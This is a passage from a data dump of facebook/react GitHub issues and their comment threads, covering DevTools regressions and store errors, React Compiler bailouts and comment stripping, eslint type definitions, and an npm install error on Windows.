![Image](https://github.com/user-attachments/assets/df5f5888-ccbe-45ef-8eca-a27897ba145d)\n\nIn this (too simple) example, it looks like the double click only helps seeing the components C and D better. But when on an actual app, for example using Material UI, the double click **isolates your components** and reduce noise. That's why it's so important to me.\n\nI have to rollback to the previous version of the extension each time it updates to get the filtering back.\n\nReal example:\n\n![Image](https://github.com/user-attachments/assets/95a790d8-0964-4cf2-b1ea-aa808a763af7)\n\nI double click on `LoginTab`, then it becomes:\n\n![Image](https://github.com/user-attachments/assets/bcca0c50-9dba-4ee1-ac66-7c02b56713bc)"}, {"author": "hoxyq", "body": "Thanks for reporting this, anyone interested in working on a fix for this?\n\nWould be nice to understand first which change caused a regression. The list of changes can be found in [changelog](https://github.com/facebook/react/blob/main/packages/react-devtools/CHANGELOG.md)."}, {"author": "clementlize", "body": "Hi @hoxyq, I found the issue. It's been introduced by your commit d85cf3e5ab6e049626a8bedddffbaec05c516195.\n\nThe exact issue happens because you encapsulated all the redux `dispatch` calls in a transition action (in the function `dispatchWrapper`).\n\nIf I move the `dispatch` out of the `startTransition` action, the double click works again.\n\nI found this [SO answer](https://stackoverflow.com/a/58612514/8026386) explaining that Redux has its own state and that therefore it's not recommended to encapsulate dispatch calls in React transitions. I don't have enough knowledge on the question to know if it's true or why, but it could explain.\n\nI couldn't go deeper on why the transitions system is messing with redux. What I could do is putting logs in the `dispatchWrapper` function, and also in the reducer. The result is very surprising.\n\n\n<img width=\"782\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/6dfc09d9-6fa9-4097-ab29-704e74dfbeaa\" />\n\n\nHere is a screenshot of my logs **without the transitions system**\n\n<img width=\"346\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/8d5c4218-8e79-4ce5-bef0-dfc0b092f60a\" />\n\n<img width=\"459\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/8d245afa-d26e-4c31-8591-cbc0d9f783d9\" />\n\n\nAnd here is a screenshot of the same logs **with the transitions system**\n\n<img width=\"346\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/18e8e799-78b7-4721-a4d7-c755bebd92e8\" />\n\n<img width=\"386\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/91551b12-a29b-429c-b603-5b9fca08c06c\" />\n\n\nIt goes like this for a while (but it's not an infinite loop, it stops at a moment. I'd say we have around 100 logs). I don't know why but it kind of looks like the action is called a lot of times.\n\n\nIs there any reason you made these changes to use the transitions system there? If the thing has no real value, I could make a PR to rollback and remove the `dispatchWrapper` function. \nYou tell me \ud83d\ude03 "}, {"author": "hoxyq", "body": "@clementlize, this is a great find.\n\n> I found the issue. It's been introduced by your commit https://github.com/facebook/react/commit/d85cf3e5ab6e049626a8bedddffbaec05c516195.\n\nJust to make sure, have you validated that the double-click action is handled correctly on the parent commit? We've been using this pattern of wrapping `dispatcher` in a `startTransition` even before my changes. I've removed `startTransition` in https://github.com/facebook/react/pull/31956/commits/717d3ee64d216df8d920c75ce4d9ffe98d99e943 and brought it back in https://github.com/facebook/react/commit/d85cf3e5ab6e049626a8bedddffbaec05c516195, but I've probably introduced some side-effects.\n\nKeyboard or click events should not be handled in `startTransition`, I think this is also the root cause of dropping keystrokes in Components panel search input.  \n\nI believe the reason for bringing the `startTransition` back was the fact that some Suspense boundaries were not resolved in time, more details in https://github.com/facebook/react/pull/32298. \n\n> The exact issue happens because you encapsulated all the redux dispatch calls in a transition action (in the function dispatchWrapper).\n\nThe `dispatch` function is actually used from built-in [`useReducer`](https://react.dev/reference/react/useReducer#dispatch) hook, so there is no need to dig into internals of `redux`.\n\nI think this whole approach of `dispatch` inside `startTransition` is incorrect. We should probably revert back to the approach before https://github.com/facebook/react/pull/31956/commits/717d3ee64d216df8d920c75ce4d9ffe98d99e943, where we would synchronously dispatch and then start a transition to update inspected view."}, {"author": "clementlize", "body": "> Just to make sure, have you validated that the double-click action is handled correctly on the parent commit?\n\nYes I tested the parent commit and the double click works\n\n> I think this whole approach of dispatch inside startTransition is incorrect. We should probably revert back to the approach before https://github.com/facebook/react/commit/717d3ee64d216df8d920c75ce4d9ffe98d99e943, where we would synchronously dispatch and then start a transition to update inspected view.\n\nOk, I think I miss some understanding to go on this path. Can I let you try and do something?"}, {"author": "Jeffrey-Uzoma", "body": "Any answers yet? I wanna look into this issue?\n"}, {"author": "clementcitiz", "body": "> Any answers yet? I wanna look into this issue?\n\nIt's been fixed in #33142 and deployed in v6.1.2. \nThanks @hoxyq "}]}
{"repo": "facebook/react", "issue_number": 32776, "issue_url": "https://github.com/facebook/react/issues/32776", "issue_title": "[DevTools Bug]: Doesn't work in browser extensions", "issue_author": "ghost", "issue_body": "### Website or app\n\nany browser extension\n\n### Repro steps\n\n1. Open devtools\n2. Or open dev tools standalone\n3. No matter what you do you can't use it to debug a browser extension\n\nPlease fix and provide documentation so we can debug our code.\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\n_No response_\n\n### DevTools version (automated)\n\n_No response_\n\n### Error message (automated)\n\n_No response_\n\n### Error call stack (automated)\n\n```text\n\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\n\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": []}
{"repo": "facebook/react", "issue_number": 32620, "issue_url": "https://github.com/facebook/react/issues/32620", "issue_title": "[Compiler Bug]: return without value causes bailout", "issue_author": "aeharding", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAMygOzgFwJYSYAEAsgJ4DCEAtgA6EKY4AUAlEcADrFFyFg5eACwRwA1kQC8RKGAQBBWrQDKCADaicEGM2YCAhjgTtJAPiIBCCwaOsA3N25EieNEWYW4I8exgIcsJgOmE5EfgEwxADkQnhRwQC+3CAJQA\n\n### Repro steps\n\nI noticed that `return` without a value (e.g. `return` vs `return undefined`) causes compiler to bailout. Please see the below examples:\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAMygOzgFwJYSYAEAsgJ4DCEAtgA6EKY4AUAlEcADrFFyFg5eACwRwA1kQC8RKGAQBBWrQDKCADaicEGM2YCAhjgTtJAPiIBCCwaOsA3N25EieNEWYW4I8exgIcsJgOmE5EfgEwxADkQnhRwQC+3CAJQA\n\nvs\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAMygOzgFwJYSYAEAsgJ4DCEAtgA6EKY4AUAlEcADrFFyFg5eACwRwA1kQC8RKGAQBBWrQDKCADaicEGM2YCAhjgTtJAPiIBCCwaOsA3N25EieNEWYW4I8exgIcsMRYACYIaHiYCMEOmE5EfgEwxADkQnjJMQC+3CCZQA\n\nprior discussion: https://github.com/reactwg/react-compiler/discussions/61\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n0.0.0-experimental-6aa8254b-20250312\n\n### What version of React Compiler are you using?\n\n0.0.0-experimental-ecdd742-20250312", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "scato3", "body": "can i fix it?"}, {"author": "suhaotian", "body": "It's component, should always return something, for eaxmple: `return null`"}, {"author": "aeharding", "body": "This appears to have been fixed."}]}
{"repo": "facebook/react", "issue_number": 32805, "issue_url": "https://github.com/facebook/react/issues/32805", "issue_title": "[DevTools Bug]:", "issue_author": "rayan2005643", "issue_body": "### Website or app\n\nhttps://github.com/facebook/react/issues/new/choose\n\n### Repro steps\n\n1. ****\n\n### How often does this bug happen?\n\nOften\n\n### DevTools package (automated)\n\n_No response_\n\n### DevTools version (automated)\n\n_No response_\n\n### Error message (automated)\n\n_No response_\n\n### Error call stack (automated)\n\n```text\n\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\n\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "rayan2005643", "body": "Hi\n"}]}
{"repo": "facebook/react", "issue_number": 32804, "issue_url": "https://github.com/facebook/react/issues/32804", "issue_title": "[Bug]: ERR_INVALID_ARG_TYPE occurs when I install project", "issue_author": "SongMinQQ", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [x] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nnone. basic React template\n\n### Repro steps\n\nWhen I install my project in local environment, this error is occured.\n\n`\n12 verbose stack TypeError [ERR_INVALID_ARG_TYPE]: The \"file\" argument must be of type string. Received undefined\n12 verbose stack     at normalizeSpawnArguments (node:child_process:539:3)\n12 verbose stack     at spawn (node:child_process:746:13)\n12 verbose stack     at promiseSpawn (C:\\Users\\koe73\\AppData\\Local\\nvm\\v22.14.0\\node_modules\\npm\\node_modules\\@npmcli\\promise-spawn\\lib\\index.js:39:16)\n12 verbose stack     at spawnWithShell (C:\\Users\\koe73\\AppData\\Local\\nvm\\v22.14.0\\node_modules\\npm\\node_modules\\@npmcli\\promise-spawn\\lib\\index.js:124:10)\n12 verbose stack     at promiseSpawn (C:\\Users\\koe73\\AppData\\Local\\nvm\\v22.14.0\\node_modules\\npm\\node_modules\\@npmcli\\promise-spawn\\lib\\index.js:12:12)\n12 verbose stack     at runScriptPkg (C:\\Users\\koe73\\AppData\\Local\\nvm\\v22.14.0\\node_modules\\npm\\node_modules\\@npmcli\\run-script\\lib\\run-script-pkg.js:77:13)\n12 verbose stack     at runScript (C:\\Users\\koe73\\AppData\\Local\\nvm\\v22.14.0\\node_modules\\npm\\node_modules\\@npmcli\\run-script\\lib\\run-script.js:9:12)\n12 verbose stack     at #run (C:\\Users\\koe73\\AppData\\Local\\nvm\\v22.14.0\\node_modules\\npm\\lib\\commands\\run-script.js:131:13)\n12 verbose stack     at async RunScript.exec (C:\\Users\\koe73\\AppData\\Local\\nvm\\v22.14.0\\node_modules\\npm\\lib\\commands\\run-script.js:40:7)\n12 verbose stack     at async Npm.exec (C:\\Users\\koe73\\AppData\\Local\\nvm\\v22.14.0\\node_modules\\npm\\lib\\npm.js:208:9)\n13 error code ERR_INVALID_ARG_TYPE\n14 error The \"file\" argument must be of type string. Received undefined\n15 verbose cwd C:\\Users\\koe73\\OneDrive\\\ubc14\ud0d5 \ud654\uba74\\app\n16 verbose os Windows_NT 10.0.19045\n17 verbose node v22.14.0\n18 verbose npm  v11.2.0\n19 verbose exit 1\n20 verbose code 1\n`\n\nI've tried several things so far:\n\nUninstalling and reinstalling Node.js\n\nUpdating npm\n\nSwitching to a Vite project\n\nDeleting npm cathe\n\nBefore I started getting this error, I was using Node.js version 18.17.1.\nWhen I switch back to 18.17.1, the error doesn't occur.\n\nBut I really want to use the latest LTS version...\n\nHelp me plz..\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.0.0\n\n### What version of React Compiler are you using?\n\nNode.Js 22.14.0(lts)", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "koreanddinghwan", "body": "Since I'm not using Windows, I can't confirm exactly, but it seems the error occurred because the Korean word '\ubc14\ud0d5\ud654\uba74' (Desktop) is in the file path. This is a common error when running Node on Windows, though I'm not entirely sure."}, {"author": "sergiotales1", "body": "Hello!\nIt seems that as @koreanddinghwan mentioned, the error is coming from the filepath.\n\nWhat \"react basic template\" are you using?\n\nPlease try creating a new template using Vite or another bundler. I suggest you use the following command from the Vite documentation:\n\n````bash\nnpm create vite@latest my-react-app -- --template react\n````\n\nThen navigate to the project's directory, install && run the application.\n````bash\ncd my-react-app\nnpm install\nnpm run dev\n````\nI've just tested this and it's working fine, let me know if worked for you as well."}, {"author": "SongMinQQ", "body": "I found the cause of the problem and fixed it temporarily.\n\nThank you for your help and advice!!\ud83d\ude06\n\nhttps://github.com/npm/cli/pull/8205"}]}
{"repo": "facebook/react", "issue_number": 32118, "issue_url": "https://github.com/facebook/react/issues/32118", "issue_title": "[DevTools Bug] Cannot add child \"301\" to parent \"155\" because parent node was not found in the Store.", "issue_author": "DilinJose", "issue_body": "### Website or app\n\nwww.github.com\n\n### Repro steps\n\nThe error was thrown at chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1173126\n    at v.emit (chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1140783)\n    at chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1142390\n    at bridgeListener (chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1552662)\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.0.1-c7c68ef842\n\n### Error message (automated)\n\nCannot add child \"301\" to parent \"155\" because parent node was not found in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1173126\n    at v.emit (chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1140783)\n    at chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1142390\n    at bridgeListener (chrome-extension://gpphkfbcpidddadnkolkpfckpihlkkil/build/main.js:1:1552662)\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot add child  to parent  because parent node was not found in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "Negatrin", "body": "The issue occurs because the React DevTools extension is outdated. To resolve this, try updating it by navigating to Chrome's extensions page and checking for updates. Alternatively, disable other extensions while working in Developer Mode, as they might be causing interference. If the problem persists, clear the cache data for React DevTools and reinstall the extension\u2014this was the solution that worked for me."}, {"author": "hariskhan802", "body": "This issue might be caused by using an outdated version of the React DevTools extension. A quick fix is to go to the Chrome extensions page and check for updates. Additionally, conflicts with other extensions could be the culprit, so try disabling them temporarily in Developer Mode to see if that helps. If the problem continues, clearing the React DevTools cache and reinstalling the extension worked for me and might work for you as well."}, {"author": "yairEO", "body": "I am having the same issue and my _React DevTools extension_ is very much up-to-date (it's automatic anyway) `6.1.1 (2/7/2025)`"}, {"author": "hoxyq", "body": "Is this constantly reproducible? If so, can someone share some code that I can use?\n\nThat would help a lot, otherwise there is not enough information for me to take action on."}, {"author": "yairEO", "body": "What \"code\" could I share? it happens when I try to inspect a certain SaaS app..\n\n![Image](https://github.com/user-attachments/assets/b96bd88e-aeec-45e0-9c91-c67e169b8ec2)"}, {"author": "hoxyq", "body": "> What \"code\" could I share? it happens when I try to inspect a certain SaaS app..\n> \n> ![Image](https://github.com/user-attachments/assets/b96bd88e-aeec-45e0-9c91-c67e169b8ec2)\n\nThis one looks unrelated to the original issue, could you please move it to a separate one?"}, {"author": "yairEO", "body": "yeah.. I got this one now :) React profiler throws random errors.. I will try to get that one related to here"}, {"author": "sanfilippopablo", "body": "Getting this too with 6.1.1"}, {"author": "HtetSansen", "body": "same for Version\n6.1.1 (2/7/2025)"}, {"author": "DilinJose", "body": "> The issue occurs because the React DevTools extension is outdated. To resolve this, try updating it by navigating to Chrome's extensions page and checking for updates. Alternatively, disable other extensions while working in Developer Mode, as they might be causing interference. If the problem persists, clear the cache data for React DevTools and reinstall the extension\u2014this was the solution that worked for me.\n\nUpdating worked for me too!"}]}
{"repo": "facebook/react", "issue_number": 32575, "issue_url": "https://github.com/facebook/react/issues/32575", "issue_title": "[Compiler Bug]: eslint-plugin-react-compiler has incorrect type definitions", "issue_author": "printfn", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [x] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://stackblitz.com/edit/vitejs-vite-c52sauuy?file=eslint.config.js\n\n### Repro steps\n\n* Install eslint-plugin-react-compiler version 19.0.0-beta-bafa41b-20250307\n* Add `reactCompiler.configs.recommended` to eslint.config.js (with `@ts-check` enabled)\n* `npx tsc -b`\n\nError:\n```\neslint.config.js:11:3 - error TS2345: Argument of type '{ plugins: { 'react-compiler': { rules: { 'react-compiler': RuleModule; }; }; }; rules: { 'react-compiler/react-compiler': string; }; }' is not assignable to parameter of type 'InfiniteDepthConfigWithExtends'.\n  Type '{ plugins: { 'react-compiler': { rules: { 'react-compiler': RuleModule; }; }; }; rules: { 'react-compiler/react-compiler': string; }; }' is not assignable to type 'ConfigWithExtends'.\n    Types of property 'rules' are incompatible.\n      Type '{ 'react-compiler/react-compiler': string; }' is not assignable to type 'Partial<Record<string, RuleEntry>>'.\n        Property ''react-compiler/react-compiler'' is incompatible with index signature.\n          Type 'string' is not assignable to type 'RuleEntry | undefined'.\n\n11   reactCompiler.configs.recommended,\n     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n\nFound 1 error.\n```\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.0.0\n\n### What version of React Compiler are you using?\n\n19.0.0-beta-bafa41b-20250307", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "mofeiZ", "body": "Thanks for the report! Looks like this should be fixed if we exported `declare const configs = { recommended: {... rules: 'error' | 'off' | 'warn'}}` instead of `rules: string`. e.g. something like adding `'error' as const` to [this line](https://github.com/facebook/react/blob/443b7ff2a8437f7736491ae7136c21d75d5a2019/compiler/packages/eslint-plugin-react-compiler/src/index.ts#L24)\n\n@poteto Do you know how the released `index.d.ts` is generated? It doesn't look to be in our [build script](https://github.com/facebook/react/blob/443b7ff2a8437f7736491ae7136c21d75d5a2019/compiler/packages/eslint-plugin-react-compiler/scripts/build.js)"}, {"author": "printfn", "body": "This seems to be fixed as of `19.0.0-beta-aeaed83-20250323`. Thanks!"}]}
{"repo": "facebook/react", "issue_number": 4563, "issue_url": "https://github.com/facebook/react/issues/4563", "issue_title": "React with Facebook's comments", "issue_author": "honzabrecka", "issue_body": "Hi, I have a page completely written in React, so in html template is only a `<div id=\"app\"></div>`, and I have to use comments widget from Facebook. I came up with:\n\n``` js\nReact.render(\n  <App/>,// creates <div id=\"fb-root\"></div>\n  document.getElementById('app'),\n  function() {\n    (function(d, s, id) {\n    var js, fjs = d.getElementsByTagName(s)[0];\n    if (d.getElementById(id)) return;\n    js = d.createElement(s); js.id = id;\n    js.src = \"//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.4\";\n    fjs.parentNode.insertBefore(js, fjs);\n    }(document, 'script', 'facebook-jssdk'));\n  }\n);\n```\n\nBut, the code above mutates the DOM, which is against React's philosophy. And let's assume that Facebook rewrites this plugin to React, so there would be two React apps - React inside React. Is it OK to include Facebook's comments like this or am I completely on a wrong path? Is it OK to have one React app inside another one (e. g. a video player inside a page)?\n", "issue_labels": ["Type: Question"], "comments": [{"author": "syranide", "body": "This assumes 0.14 (to get the DOM node), you're free to do whatever _inside_ the safe-div. I've just included the outer div for showcase, it's not necessary.\n\n``` js\nclass ExternalFooBarWrapper {\n  componentDidMount() {\n    doWhateverInside(this.refs.safe);\n  }\n\n  render() {\n    return (\n      <div>\n        blabla\n        <div ref=\"safe\" />\n      </div>\n    );\n  }\n}\n```\n"}, {"author": "jimfb", "body": "@syranide is correct.  You can do whatever you want within the children of a leaf node of a React render tree.  React does not prohibit you from using mutative APIs, as long as you don't interfere with nodes that were rendered by React (that is to say, don't mutate a node that was rendered by React, because that would confuse React's reconciliation algorithm).  You can add/mutate children to a leaf node, but don't modify the children to a non-leaf.\n\nWe're trying to use github issues to track bugs in React, rather than questions.  For this reason, I'm going to close out this bug.  Feel free to continue the discussion on this thread.  For future reference, questions like this are better answered on StackOverflow.\n"}, {"author": "SathishPerf", "body": "hi"}, {"author": "SathishPerf", "body": "helo"}]}
{"repo": "facebook/react", "issue_number": 32642, "issue_url": "https://github.com/facebook/react/issues/32642", "issue_title": "[DevTools Bug] Cannot remove node \"37930\" because no matching node was found in the Store.", "issue_author": "boss6825", "issue_body": "### Website or app\n\nhttp://localhost:3000/page/edit\n\n### Repro steps\n\n![Image](https://github.com/user-attachments/assets/5ea7058e-b8f6-4520-b490-a1af569da1f1)\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.1.1-44c3d3d665\n\n### Error message (automated)\n\nCannot remove node \"37930\" because no matching node was found in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1193929\n    at v.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1160378)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1161985\n    at bridgeListener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1572692)\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot remove node  because no matching node was found in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "Susheel4115", "body": "This is due to extensions in your browser try with private or incognito tab and lmk!"}, {"author": "boss6825", "body": "works fine now"}]}
{"repo": "facebook/react", "issue_number": 31364, "issue_url": "https://github.com/facebook/react/issues/31364", "issue_title": "[Compiler]: All comments removed from source code", "issue_author": "swissspidy", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [X] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwFkBPAQU0wAoAlPmAAdNvhgJcsNgB4AfOPwr8cgMIQAtloR1cYblIBKCLRABuCQvgD0SiSo3bd+w1IAKUsAhhWb9spq9gDc4gC+4uK0DMys+Jo6egZGCKbm-kIiQXYAVPi4MGR0YJRkuDhgyPgApFX4UD4wdGS6AHT4ACoAFkxg+HAuyfgA7kyUlPgARgiSZpbW+Lm2QYMlBLgYBAC8+AD6e-wA5AASCBMQtWBHgmF0Qba2Xb39g0n6o+OTZJSQ07NSDLWNrKIJSGTNNSEJgWBTATboXDhOS2aGwu6Re50GKMFhsRKuFKeby+TLCMQSUQgRqzOiXXTmKl3FQPfKFYqlcqVap1ao05qtBAdHp9AZDD5jCb4OkEGZzIE2ZarVhgDZbfC7A7HM4XK43O45R7PUVvQmfKU-P5ygDWCEwuBBlIk4NkUJhcIRSJRaIUGJA4SAA\n\n### Repro steps\n\nI setup my Babel & webpack config to preserve comments, specifically comments for translators.\r\n\r\nIn systems like WordPress, i18n strings & comments are directly in the source code and must be preserved.\r\n\r\nWhen React Compiler optimizes a component, all comments will be stripped.\r\n\r\nWhen React Compiler is disabled, e.g. with `use no memo` or when it encounters a disabled lint rule, then the component won't be touched at all and comments are preserved as expected.\r\n\r\nUnfortunately the Playground link doesn't show this, as it seems to strip all comments no matter what.\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n17\n\n### What version of React Compiler are you using?\n\n0.0.0-experimental-34d04b6-20241024", "issue_labels": ["Type: Question", "Component: React Compiler", "Resolution: Stale"], "comments": [{"author": "josephsavona", "body": "Thanks for posting. I can imagine it\u2019s frustrating to have spent a lot of effort making your translations work via comments and to have the compiler break this. \r\n\r\nThe short answer is: we can't preserve comments in a way that works for all the schemes people have for them. This is because comments sort of _visually_ correspond to a part of the program, but this is not precise enough for tooling. If you've ever seen a comment get moved from something like prettier, this is why. \r\n\r\nTo make this concrete, consider a slightly tweaked snippet from your example:\r\n\r\n\r\n```js\r\n// translators: %s is username\r\nconst element = <div>{__s(\u201c...%s...\u201d)}</div>;\r\n```\r\n\r\nA human knows that this comment is really referring to the `__s(\"...\")` call expression. But JavaScript tooling just sees that this comment precedes the variable declaration statement. \r\n\r\nBecause comments have no semantic meaning in JavaScript -- they do not affect runtime behavior of the program -- it's perfectly fine for a tool to rewrite this code as follows:\r\n\r\n```js\r\nconst t0 = __s(\u201c...%s...\u201d);\r\n// translators: %s is username\r\nconst element = <div>{t0}</div>;\r\n```\r\n\r\nAs you can see, it isn't enough to preserve comments. This particular comment scheme is meant to apply comment information to strings inside calls. So you might say, just move the comment up one line! But someone else might have a custom comment scheme that is meant to describe variable declarations, and then it would break if we moved the comment up! . There's literally no way for an arbitrary tool to know how to \"correctly\" preserve comments while rewriting code. \r\n\r\nThis is why JavaScript -- like effectively all modern languages -- makes comments semantically meaningless. This makes it safe to not preserve comments, or to make a best-effort. Many languages also typically carve out a safe space for semantic annotations. Rust has `#` syntax, JS has \"use strict\" style string directives as an unofficial pattern, etc. \r\n\r\nSo I hope this helps to put the existing behavior in context. We understand that it would be convenient if the compiler preserved comments, but it is impossible to do so in a general purpose way that everyone would be happy with. There isn't even a good-enough heuristic. As such, we do not and will not support preserving comments. \r\n\r\nIn contrast, type annotations provide semantic information in a structured form. We currently preserve some type annotations, and would consider supporting preserving them fully. \r\n\r\nWe would recommend exploring i18n approaches that do not depend on comments, and instead put the information about the meaning of the various interpolations (\"%s\") into the program itself. There are a number of popular libraries for this. "}, {"author": "swissspidy", "body": "Thanks for the thorough response!\r\n\r\nI feared as much. While I agree that in a JS world comments are not the best way for such annotations, changing the i18n approach is unfortunately easier said than done. I'm sure you can understand that doing so in an ecosystem as big as WordPress is an enormous undertaking. The React-based Gutenberg editor is currently [exploring using React Compiler](https://github.com/WordPress/gutenberg/pull/66361), and this is a regression from an i18n perspective. While we can probably find a workaround there, thousands of extensions (plugins) will have to do the same.\r\n\r\nWould you be open to consider some middleground like preserving specific types of comments (e.g. `/*! preserve me */) or if they are within a function call itself (e.g. `__( /* translators: %s: username */ 'Hello %s'  )` or something?"}, {"author": "tyxla", "body": "I second @swissspidy here. Finding a workaround is not a challenge at all, but propagating it through hundreds of thousands of third-party projects (many of which don't even use React or will not adopt React 19 or the React Compiler) with as many third-party developers accumulating over the past ~20 years is doomed to failure. \r\n\r\nAn ideal solution would be to allow the Babel plugin to provide an environment configuration variable that enables skipping some comments. There's already a precedent for that with the `@enableMemoizationComments` flag:\r\n\r\nhttps://github.com/facebook/react/blob/fe04dbcbc4185d7c9d7afebbe18589d2b681a88c/compiler/packages/babel-plugin-react-compiler/src/HIR/Environment.ts#L458C3-L458C28\r\n\r\nWould it be feasible to consider providing a similar flag that lets us declare an array of strings or regexes, and the React Compiler would skip stripping comments that have a match?"}, {"author": "guillaumebrunerie", "body": "How are these special comments used? Is there a tool that automatically extracts them into some more usable format for translators? If so, can\u2019t this tool be run before the React compiler instead? Surely there are a bunch of other build steps (like minifiers and bundlers) that already remove comments."}, {"author": "josephsavona", "body": "> An ideal solution would be to allow the Babel plugin to provide an environment configuration variable that enables skipping some comments. There's already a precedent for that with the @enableMemoizationComments flag\r\n\r\nJust a quick note that this flag isn\u2019t skipping comments, it tells the compiler to _synthesize_ comments describing what it\u2019s memorizing. You can see this for yourself by adding `// @enableMemoizationComments` as the first line in the playground. \r\n\r\nThe compiler transforms the Babel AST into our own internal representation (called HIR), runs an extensive number of passes, and then completely rebuilds the AST. Per my comment above, it is impossible for us to preserve comments in this process in a way that would work with every scheme you could come up with for comments. That is why the spec specifically makes comments semantically meaningless: otherwise it\u2019s just crazy town with everyone inventing different incompatible comment schemes and tooling literally can\u2019t touch your code. \r\n\r\n> If so, can\u2019t this tool be run before the React compiler instead? \r\n\r\nYes! This is what I would explore. "}, {"author": "swissspidy", "body": "Apologies for the late response.\r\n\r\n> How are these special comments used? Is there a tool that automatically extracts them into some more usable format for translators?\r\n\r\nYes, exactly, it's a string extraction tool that then transfers the found strings to a translation platform or in a gettext POT file.\r\n\r\n> If so, can\u2019t this tool be run before the React compiler instead? Surely there are a bunch of other build steps (like minifiers and bundlers) that already remove comments.\r\n\r\nWe have set up our existing tooling (babel, webpack) so that translator comments are preserved. That works quite well so far.\r\n\r\nIn theory extracting the string from the source files (or finding any other solution) would be better for sure, but this is not feasible for the WordPress ecosystem, as pointed out by @tyxla. For WordPress core itself yes, there might be alternative approaches we could take in the short to medium term, as we are in full control there. But for the hundreds of thousands of plugins out there that's nearly impossible. And having two separate implementations just causes fragmentation."}, {"author": "nathanmarks", "body": "@josephsavona Is this why I'm running into some weird issues where sometimes istanbul is not instrumenting the code properly? I'm seeing statements, functions, etc just not even getting recognized full stop.\r\n\r\nI spent a few hours diving into it. I first noticed that the statement/function/branch info instanbul injects into the file is completely missing things, (along with source location not being correct for some that did make it).\r\n\r\nIt looks like when the babel instanbul plugin runs, node visitors are simply not getting triggered for some things.\r\n\r\nFor example, given this super simple example:\r\n```ts\r\nexport default function useSomething() {\r\n  const isMobile = useIsMobile()\r\n\r\n  return isMobile\r\n}\r\n```\r\n\r\n`istanbul` is expecting these visitors 